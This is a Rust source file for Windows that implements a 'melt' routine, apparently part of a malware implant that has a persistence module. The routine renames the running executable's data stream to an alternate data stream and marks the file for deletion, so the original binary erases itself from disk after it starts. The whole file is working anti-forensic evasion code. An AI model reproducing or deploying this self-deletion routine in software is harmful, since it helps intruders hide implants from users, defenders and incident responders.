use crate::recovery::persistence::is_running_from_persistence;
use crate::recovery::settings::RecoveryControl;
use std::ffi::c_void;
use std::mem::size_of;
use tracing::{debug, error, info};
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FileDispositionInfo, FileRenameInfo, SetFileInformationByHandle, DELETE,
    FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_RENAME_INFO,
    FILE_SHARE_DELETE, FILE_SHARE_READ, OPEN_EXISTING,
};
use windows::core::PCWSTR;

pub fn perform_melt() {
    if !RecoveryControl::global().melt_enabled() {
        debug!("melt (self-delete) is disabled");
        return;
    }

    if is_running_from_persistence() {
        debug!("running from persistence location, skipping melt");
        return;
    }

    info!("attempting to melt (self-delete) original executable");

    unsafe {
        if let Err(e) = delete_self_on_close() {
            error!("failed to melt: {}", e);
        } else {
            info!("executable marked for deletion on close");
        }
    }
}

#[allow(unsafe_op_in_unsafe_fn)]
unsafe fn delete_self_on_close() -> Result<(), String> {
    let current_exe = std::env::current_exe().map_err(|e| e.to_string())?;
    let path_w: Vec<u16> = current_exe
        .to_string_lossy()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    let handle = CreateFileW(
        PCWSTR(path_w.as_ptr()),
        DELETE.0,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        HANDLE::default(),
    )
    .map_err(|e| format!("failed to open file for deletion: {}", e))?;

    if handle.is_invalid() {
        return Err("invalid file handle".to_string());
    }

    // Step 1: Rename to alternate data stream (ADS) to clear image lock
    // ":wtf"
    let stream_name = ":wtf\0".encode_utf16().collect::<Vec<u16>>();
    let rename_info_size = size_of::<FILE_RENAME_INFO>() + (stream_name.len() * 2);
    let mut buffer = vec![0u8; rename_info_size];
    let rename_info = &mut *(buffer.as_mut_ptr() as *mut FILE_RENAME_INFO);
    
    rename_info.Anonymous.ReplaceIfExists = true.into();
    rename_info.RootDirectory = HANDLE::default();
    rename_info.FileNameLength = ((stream_name.len() - 1) * 2) as u32; // -1 for null terminator in length count
    
    std::ptr::copy_nonoverlapping(
        stream_name.as_ptr(),
        rename_info.FileName.as_mut_ptr(),
        stream_name.len() - 1,
    );

    if SetFileInformationByHandle(
        handle,
        FileRenameInfo,
        buffer.as_ptr() as *const c_void,
        rename_info_size as u32,
    ).is_err() {
         let _ = CloseHandle(handle);
         return Err("failed to rename to ADS".to_string());
    }

    // Step 2: Set DeleteDisposition
    let delete_info = FILE_DISPOSITION_INFO {
        DeleteFile: true.into(),
    };

    if SetFileInformationByHandle(
        handle,
        FileDispositionInfo,
        &delete_info as *const _ as *const c_void,
        size_of::<FILE_DISPOSITION_INFO>() as u32,
    ).is_err() {
        let _ = CloseHandle(handle);
        return Err("failed to set delete disposition".to_string());
    }

    CloseHandle(handle);
    Ok(())
}
